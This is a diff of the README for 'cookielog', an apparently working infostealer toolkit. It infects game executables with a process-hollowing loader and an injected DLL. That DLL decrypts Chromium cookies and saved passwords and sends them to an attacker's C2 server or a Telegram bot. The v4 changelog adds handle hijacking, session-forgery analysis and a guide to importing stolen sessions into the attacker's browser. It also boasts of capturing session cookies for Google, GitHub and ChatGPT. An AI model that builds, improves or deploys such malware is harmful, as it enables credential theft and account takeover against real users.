@@ -180,9 +180,86 @@ python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --d
 
 ## What's New
 
-### v3 -- handle hijacking (current)
+### v4 -- UTF-8 fix, SHA256 domain hash verification, session cryptanalysis (current)
 
-**Browser-locked DB extraction without closing the browser.** Vivaldi (and some
+**PutJ UTF-8 passthrough (critical).** The payload's manual JSON serializer was escaping
+bytes >= 0x80 as `\u00XX`, which corrupts UTF-8 multi-byte sequences. For example, the
+character `ç` (UTF-8 `0xC3 0xA7`) was being escaped as `\u00c3\u00a7`, which decodes to
+`Ã§` instead of `ç`. This affected cookie values and saved passwords containing accented
+characters (common in Portuguese, French, Spanish names and passwords).
+
+Fix: removed the `c>127` condition from the escape branch. `PutJ` now only escapes
+control characters (`c < 32`) as `\u00XX`; bytes >= 0x80 pass through as raw UTF-8, which
+is valid JSON since JSON strings are defined as sequences of UTF-8 encoded Unicode code
+points.
+
+Test result: 82 passwords, all 82 clean (0 dirty). Before the fix, 8 of 82 were corrupted.
+Example: `Ma@çhado90_90` (was `Ma@Ã§hado90_90`), `Maçhado9090$_` (was `MaÃ§hado9090$_`).
+
+**SHA256 domain hash verification in DecCookie.** Chrome >= 118 prepends a 32-byte
+`SHA256(host_key)` hash to the AES-256-GCM decrypted plaintext of both v10 and v20
+cookies. The previous fix (v3) unconditionally stripped the first 32 bytes from all v10
+decrypted values, which corrupts password values (passwords do not have this prefix).
+
+Fix: `DecCookie` now takes a `host_key` parameter (the cookie's domain, e.g.
+`.youtube.com`). After AES-GCM decryption, it computes `SHA256(host_key)` and compares
+it to the first 32 bytes of the plaintext. If they match, the 32-byte domain hash is
+stripped. If they don't match (passwords, or cookies from older Chrome versions without
+the hash), 0 bytes are stripped. This correctly handles:
+- v10 cookies with domain hash (Chrome >= 118) -- 32 bytes stripped
+- v10 cookies without domain hash (Chrome < 118) -- 0 bytes stripped
+- v20 cookies (Chrome >= 127, app-bound) -- 32 bytes stripped
+- Passwords (v10 encrypted, no domain hash) -- 0 bytes stripped
+
+**Manual SHA-256 implementation.** Added a from-scratch FIPS 180-4 SHA-256 implementation
+(`Sha256Hash`, `Sha256Init`, `Sha256Update`, `Sha256Final`, `Sha256Block`) in `ckdll.cpp`.
+This is needed because the CRT-less payload cannot use the standard library's hash
+functions, and `BCryptHash` requires additional setup that is fragile in the hollowed
+process. The implementation is ~60 lines, uses only `memset`/`memcpy` (custom CRT), and
+produces a 32-byte digest used for domain hash verification.
+
+**UTF-16LE detection for passwords.** `DumpPasswords` now checks whether the decrypted
+password value is UTF-16LE encoded (every odd byte is `0x00`). If so, it converts to
+UTF-8 before JSON output. In practice, Chromium stores passwords as UTF-8, so this rarely
+triggers -- but it prevents garbage output if a password is stored as UTF-16LE.
+
+**`session_break.py` -- Python session cookie cryptanalysis tool.** A standalone Python
+tool that combines handle hijacking (same `NtQuerySystemInformation` technique as the C++
+payload), DPAPI key extraction, and AES-256-GCM decryption with full cryptanalysis of the
+decrypted session cookie values. Features:
+
+- **Handle hijack** -- `hijack_cookie_db()` duplicates the browser's SQLite handle via
+  `NtQuerySystemInformation(0x40)` with a growing buffer (4MB initial, retries with
+  `ret_len + 0x10000` until success). Handles the ~311k-handle / ~12MB buffer requirement.
+- **DPAPI + AES-GCM** -- `get_chromium_key()` decrypts the `Local State` AES key via
+  `CryptUnprotectData`; `decrypt_chromium_value()` decrypts v10/v20 cookies with
+  `BCryptDecrypt` and strips the 32-byte SHA256 domain hash when it matches.
+- **Cryptanalysis** -- `classify_and_analyze()` classifies each session cookie value by
+  structure: JWT, hex string, base64, numeric, URL-encoded JSON, opaque token, Express
+  signed cookie, two-part token. For JWTs, `analyze_jwt()` decodes header + payload and
+  assesses the `alg` field for forgery vulnerabilities (e.g. `alg: none`, `HS256` with
+  known/weak keys). `assess_jwt_forgery()` and `assess_entropy_forgery()` evaluate whether
+  the session can be forged without the server's secret. `find_correlations()` detects
+  shared prefixes, substrings, and duplicate values across cookies.
+- **Outputs** -- `loot/session_decrypted.json` (decrypted session cookies with analysis
+  metadata) and `loot/cryptanalysis_report.json` (classification summary, forgery
+  assessment, correlations).
+
+**`COOKIE_EDITOR_GUIDE.md`.** New guide file with step-by-step instructions for importing
+`loot/session_cookies.json` into the Cookie-Editor browser extension, including per-domain
+import instructions, Netscape format fallback, troubleshooting table, and file format
+reference.
+
+**Test results (v4).** 90 session cookies (all 90 clean, 0 dirty), 82 passwords (all 82
+clean, 0 dirty). High-value session cookies captured: chatgpt.com (`csrf`, `oai-gn`,
+`oai-asli`, `callback-url`), github.com (`_gh_sess`, `color_mode`, `tz`),
+steamcommunity.com (`sessionid`, `steamCountry`), claude.ai (`_cfuvid`, `ion-vk`),
+discord.com (`locale`, `_cfuvid`), instagram.com (`rur`), youtube.com (`YSC`),
+google.com (`S`, `GMAIL_AT`).
+
+### v3 -- handle hijacking
+
+**Browser-locked DB extraction without closing the browser.** Vivaldi (and some Vivaldi (and some
 Chrome/Edge configurations) hold a 0-sharing lock on the cookie/password SQLite DB,
 causing `CreateFileW` to fail with error 32 (`ERROR_SHARING_VIOLATION`). The payload
 now falls back to **handle hijacking**: it enumerates all system handles via
@@ -376,6 +453,7 @@ cookielog/
 |-- auto.bat              # Shortcut: python auto.py %*
 |-- pick.py               # GUI infector (standalone, manual C2 config)
 |-- listen.py             # HTTP listener: receives exfiltrated cookies
+|-- session_break.py      # Python session cookie extractor + cryptanalysis (791 lines)
 |-- tg_chatid.py          # Helper: finds Telegram chat ID from bot token
 |-- sink.py               # Named pipe server (local fallback, no C2 needed)
 |-- swap.py               # Splits cookies by site (per-site cookies.txt)
@@ -384,19 +462,20 @@ cookielog/
 |-- start_attack.bat      # Starts listener + pick.py GUI together
 |-- test_curl.bat         # Tests listener with curl
 |-- cmd_init.cmd          # Linux-style aliases for cmd.exe
+|-- COOKIE_EDITOR_GUIDE.md # How to import session cookies into Cookie-Editor extension
 |-- PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
 |-- PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
 |-- requirements.txt      # Python deps
 |-- config.json           # Saved API keys (auto-generated, gitignored)
 |-- .gitignore
 |-- src/
-|   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable)
+|   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable, ~1332 lines)
 |   |-- loader.cpp        # Loader (process hollowing + rename-restore)
 |   |-- payload.h         # Generated byte array of the DLL (auto-generated)
 |   `-- gen.ps1           # Generates payload.h from ckdll.dll
 |-- bin/                  # Build output
 |   |-- loader.exe        # ~156 KB
-|   `-- ckdll.dll         # ~46 KB
+|   `-- ckdll.dll         # ~49 KB
 |-- ifec/                 # Infected outputs (gitignored)
 |   |-- folds/            # Folder-mode infections (game + dependencies)
 |   `-- apps/             # Standalone infections (single .exe)
@@ -406,7 +485,9 @@ cookielog/
 |   |-- passwords.json    # Saved passwords with usernames
 |   |-- passwords.txt     # Saved passwords (tab-separated)
 |   |-- session_cookies.json # Session-only cookies (expirationDate == 0)
-|   `-- session_cookies.txt  # Session-only, Netscape format
+|   |-- session_cookies.txt  # Session-only, Netscape format
+|   |-- session_decrypted.json  # Decrypted session cookies + analysis (session_break.py)
+|   `-- cryptanalysis_report.json # Cryptanalysis summary (session_break.py)
 `-- tools/
     `-- PsExec64.exe      # Sysinternals (for legacy v20 extraction)
 ```
@@ -481,9 +562,15 @@ The end-to-end infection and exfiltration chain:
 6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
    C2 URL as Cookie-Editor JSON.
 7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
-   (keyed on `domain`+`name`+`path`), and writes `loot/all_cookies.json` + `loot/all_cookies.txt`.
-8. **Import.** The attacker imports `loot/all_cookies.json` into their own browser via the
-   Cookie-Editor extension.
+   (keyed on `domain`+`name`+`path`), and writes `loot/all_cookies.json` + `loot/all_cookies.txt`
+   + `loot/session_cookies.json` + `loot/passwords.json`.
+8. **Import.** The attacker imports `loot/session_cookies.json` (or `all_cookies.json`) into
+   their own browser via the Cookie-Editor extension. See
+   **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)** for step-by-step instructions.
+9. **Cryptanalysis (optional).** `session_break.py` runs on the attacker's machine to
+   decrypt session cookies and analyze their structure (JWT, forgery potential,
+   cross-domain correlations). Outputs `loot/session_decrypted.json` and
+   `loot/cryptanalysis_report.json`.
 
 ---
 
@@ -585,6 +672,42 @@ python cookielog.py
 
 Stage 2 writes the decrypted key to `C:\ProgramData\cookielog\v20.key`, which stage 3 reads.
 
+### `session_break.py` -- session cookie extractor + cryptanalysis
+
+Standalone Python tool that extracts session cookies from a running browser via handle
+hijacking (same technique as the C++ payload), decrypts them with DPAPI + AES-256-GCM,
+and performs full cryptanalysis on the decrypted values. No injection required -- runs
+directly on the attacker's machine.
+
+```bat
+python session_break.py                           :: extract from all Chromium browsers
+python session_break.py --browser vivaldi          :: target one browser
+python session_break.py --browser vivaldi --report :: extract + cryptanalysis report
+```
+
+What it does:
+
+1. **Handle hijack** -- enumerates all system handles via `NtQuerySystemInformation(0x40)`
+   with a growing buffer (4MB -> 12MB+), finds the browser's SQLite DB handle, duplicates
+   it with `DUPLICATE_SAME_ACCESS`, and reads the file via `ReadFile`. No need to close the
+   browser.
+2. **Key extraction** -- reads `Local State`, base64-decodes the `encrypted_key`, and
+   calls `CryptUnprotectData` (DPAPI) to recover the 32-byte AES key.
+3. **Decryption** -- decrypts each cookie value with `BCryptDecrypt` (AES-256-GCM).
+   Detects and strips the 32-byte `SHA256(host_key)` domain hash prefix (Chrome >= 118).
+4. **Classification** -- classifies each session cookie value: JWT, hex, base64, numeric,
+   URL-encoded JSON, opaque token, Express signed, two-part token.
+5. **JWT analysis** -- decodes JWT header + payload, assesses `alg` for forgery
+   vulnerabilities (`none`, `HS256` with weak key, `RS256` key confusion).
+6. **Forgery assessment** -- evaluates whether each session can be forged without the
+   server secret (entropy analysis, known-key check, algorithm confusion).
+7. **Correlation** -- finds shared prefixes, substrings, and duplicate values across
+   cookies from different domains.
+
+Outputs:
+- `loot/session_decrypted.json` -- decrypted session cookies with analysis metadata
+- `loot/cryptanalysis_report.json` -- classification summary, forgery assessment, correlations
+
 ### `swap.py` -- post-processing
 
 Splits the captured cookies into per-site Netscape files for selective import:
@@ -611,7 +734,7 @@ build.bat
 
 Produces:
 
-- `bin\ckdll.dll` -- payload (~46 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
+- `bin\ckdll.dll` -- payload (~49 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
 - `bin\loader.exe` -- loader (~156 KB, `/MT` static CRT, GUI subsystem)
 - `src\payload.h` -- the DLL as a byte array, embedded into the loader
 
@@ -643,6 +766,8 @@ test_curl.bat 9090
 | `loot/passwords.txt` | Saved passwords (tab-separated: domain, username, password) | `listen.py` |
 | `loot/session_cookies.json` | Session-only cookies, Cookie-Editor JSON | `listen.py` |
 | `loot/session_cookies.txt` | Session-only cookies, Netscape format | `listen.py` |
+| `loot/session_decrypted.json` | Decrypted session cookies + analysis metadata | `session_break.py` |
+| `loot/cryptanalysis_report.json` | Cryptanalysis summary (classification, forgery, correlations) | `session_break.py` |
 | `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
 | `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
 | `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
@@ -740,6 +865,7 @@ Exfiltration priority in the payload:
 - `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
 - `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
 - Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
+- Manual FIPS 180-4 SHA-256 implementation for domain hash verification (no CRT hash).
 - `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
   inside the hollowed process; disabling intrinsics prevents that.
 
@@ -770,6 +896,9 @@ extension:
 `expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
 2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict -- the payload translates both).
 
+For step-by-step instructions on importing these files into the Cookie-Editor browser
+extension, see **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.
+
 ### Chromium cookie decryption
 
 Chromium stores cookie values encrypted with AES-256-GCM:
@@ -779,6 +908,40 @@ Chromium stores cookie values encrypted with AES-256-GCM:
 2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
    (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
    prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.
+
+**Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
+`SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
+computing `SHA256(host_key)` (using the manual FIPS 180-4 implementation) and comparing it
+to the first 32 bytes of the decrypted output. If they match, the 32 bytes are stripped
+before output. If they don't match (passwords, or cookies from Chrome <118), 0 bytes are
+stripped. This is critical because passwords are also v10-encrypted but do not have the
+domain hash prefix -- unconditionally stripping 32 bytes would corrupt password values.
+
+The `DecCookie` function signature:
+
+```c
+static bool DecCookie(const unsigned char* enc, int n,
+                      unsigned char* out, int* on,
+                      const char* host_key);  // cookie domain for SHA256 verification
+```
+
+For cookies, `host_key` is the cookie's domain (e.g. `.youtube.com`). For passwords,
+`host_key` is the origin URL -- the SHA256 won't match, so no bytes are stripped.
+
+### Manual SHA-256 (FIPS 180-4)
+
+The CRT-less payload cannot use standard library hash functions. A from-scratch SHA-256
+implementation is included in `ckdll.cpp` (~60 lines):
+
+```c
+static void Sha256Hash(const unsigned char* data, unsigned int len,
+                       unsigned char* out32);
+```
+
+Uses only custom `memset`/`memcpy` (no CRT). The implementation follows FIPS 180-4:
+64-round compression, 8-word state, 64-entry constant table, message padding with
+1-bit + length encoding. The 32-byte digest is used exclusively for domain hash
+verification in `DecCookie`.
 
 ### Firefox cookies
 
@@ -861,6 +1024,9 @@ opened read-only with SQLite.
 | DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
 | `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
 | No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\cookielog\drop.json` |
+| Cookie/password values contain `Ã§` or `Ã£` instead of `ç` or `ã` | Old payload escaped bytes >= 0x80 as `\u00XX`, corrupting UTF-8 multi-byte sequences | Fixed in v4 (PutJ passes bytes >= 0x80 as raw UTF-8). Rebuild with `build.bat` |
+| Cookie values have 32 bytes of binary garbage at the start | Chrome >=118 prepends SHA256(host_key) to decrypted plaintext; old payload didn't strip it | Fixed in v4 (DecCookie verifies and strips 32-byte domain hash). Rebuild with `build.bat` |
+| Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
 
 ---
 
@@ -871,7 +1037,9 @@ opened read-only with SQLite.
 | `install.bat` | One-click dependency installer (Python, MSVC, CLI tools, build, cmd_init) |
 | `auto.bat` | Shortcut: `python auto.py %*` |
 | `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
+| `session_break.py` | Python session cookie extractor + cryptanalysis (handle hijack + DPAPI + AES-GCM + JWT analysis) |
 | `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
 | `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
 | `build.bat` | Compiles `ckdll.dll` + `loader.exe` (generates `payload.h`) |
 | `cmd_init.cmd` | Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`) + cookielog + Python shortcuts |
+| `COOKIE_EDITOR_GUIDE.md` | Step-by-step guide for importing session cookies into Cookie-Editor |
